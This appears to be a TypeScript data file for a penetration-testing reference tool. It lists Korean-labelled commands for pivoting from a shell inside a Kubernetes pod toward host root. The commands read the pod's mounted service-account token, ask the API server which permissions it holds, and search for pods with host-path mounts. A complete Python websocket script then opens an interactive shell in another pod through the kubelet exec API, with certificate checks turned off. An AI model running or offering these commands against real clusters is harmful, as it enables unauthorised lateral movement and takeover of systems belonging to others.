// Same reference-only shape as linuxPrivescCommands.ts -- these run from a
// shell already inside a Kubernetes pod, using that pod's own service
// account token/CA cert (always mounted at the fixed path below unless
// automountServiceAccountToken is explicitly disabled).
export type K8sCommand = { label: string; command: string; note?: string };
export type K8sCategory = { id: string; title: string; description: string; commands: K8sCommand[] };

const SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount";

export const k8sPivotCategories: K8sCategory[] = [
  {
    id: "confirm-pod",
    title: "파드 안인지 확인",
    description: "쉘이 컨테이너/파드 안에서 실행 중인지, 서비스어카운트 토큰이 있는지 " +
      "먼저 확인합니다.",
    commands: [
      { label: "Kubernetes 환경변수 확인", command: "env | grep KUBERNETES" },
      { label: "서비스어카운트 토큰 확인", command: `ls -la ${SA_DIR}/` },
      { label: "네임스페이스 확인", command: `cat ${SA_DIR}/namespace` },
    ],
  },
  {
    id: "rbac-check",
    title: "RBAC 자기 권한 확인",
    description: "이 파드의 서비스어카운트가 실제로 뭘 할 수 있는지 API 서버에 직접 " +
      "물어봅니다 — kubectl 없이도 됩니다. \"nodes/proxy\"·\"pods/exec\" 같은 권한이 " +
      "있으면 다른 파드로 넘어갈 길이 있다는 뜻입니다.",
    commands: [
      { label: "selfsubjectrulesreview로 전체 권한 확인",
        command: `curl -sk --cacert ${SA_DIR}/ca.crt -H "Authorization: Bearer $(cat ${SA_DIR}/token)" ` +
          `-X POST https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT` +
          "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H 'Content-Type: application/json' " +
          `-d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"$(cat ${SA_DIR}/namespace)"}}'` },
    ],
  },
  {
    id: "privileged-pod-discovery",
    title: "특권 파드 탐색",
    description: "hostPath로 /, /proc, /sys 같은 호스트 경로를 마운트한 파드를 찾습니다 — " +
      "그런 파드에 exec로 들어가면 마운트된 호스트 파일시스템을 통해 사실상 루트 권한입니다. " +
      "monitoring 네임스페이스의 node-exporter류가 흔한 후보입니다.",
    commands: [
      { label: "전체 파드 목록 + hostPath 마운트 필터",
        command: `curl -sk --cacert ${SA_DIR}/ca.crt -H "Authorization: Bearer $(cat ${SA_DIR}/token)" ` +
          "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/pods | python3 -c " +
          '"import json,sys\\nd=json.load(sys.stdin)\\nfor p in d[\'items\']:\\n' +
          " vols=[v for v in p['spec'].get('volumes',[]) if v.get('hostPath')]\\n" +
          " if vols: print(p['metadata']['namespace'], p['metadata']['name'], " +
          "[v['hostPath']['path'] for v in vols])\"",
        note: "결과에서 namespace/pod 이름을 kubelet exec 스크립트의 입력값으로 씁니다." },
    ],
  },
  {
    id: "kubelet-exec",
    title: "kubelet exec API로 특권 파드 진입",
    description: "kubelet의 10250 포트 exec API는 REST가 아니라 WebSocket 업그레이드라서 " +
      "curl로는 안 되고 websocket-client가 필요합니다. {NODE}/{NAMESPACE}/{POD}/{CONTAINER}를 " +
      "위 단계에서 찾은 값으로 바꾸세요 -- 컨테이너가 hostPath로 호스트 루트를 마운트했다면 " +
      "이 셸이 곧 호스트 루트 파일시스템 접근입니다.",
    commands: [
      { label: "websocket-client 설치 확인/설치",
        command: "python3 -c 'import websocket' 2>/dev/null || pip3 install --user websocket-client" },
      { label: "kubelet exec로 파드 안 인터랙티브 쉘",
        command: "python3 -c \"\n" +
          "import ssl, sys, threading, websocket\n" +
          `token = open('${SA_DIR}/token').read().strip()\n` +
          "node, ns, pod, container = '{NODE}', '{NAMESPACE}', '{POD}', '{CONTAINER}'\n" +
          "url = (f'wss://{node}:10250/exec/{ns}/{pod}/{container}'\n" +
          "       '?command=/bin/sh&input=1&output=1&tty=1')\n" +
          "ws = websocket.create_connection(url, header=[f'Authorization: Bearer {token}'],\n" +
          "    sslopt={'cert_reqs': ssl.CERT_NONE}, subprotocols=['channel.k8s.io'])\n" +
          "def pump_stdin():\n" +
          "    for line in sys.stdin:\n" +
          "        ws.send(bytes([0]) + line.encode())\n" +
          "threading.Thread(target=pump_stdin, daemon=True).start()\n" +
          "while True:\n" +
          "    data = ws.recv()\n" +
          "    if not data: break\n" +
          "    sys.stdout.buffer.write(data[1:]); sys.stdout.flush()\n" +
          "\"",
        note: "채널 바이트(맨 앞 1바이트)는 0=stdin, 1=stdout, 2=stderr, 3=error 스트림입니다." },
    ],
  },
];
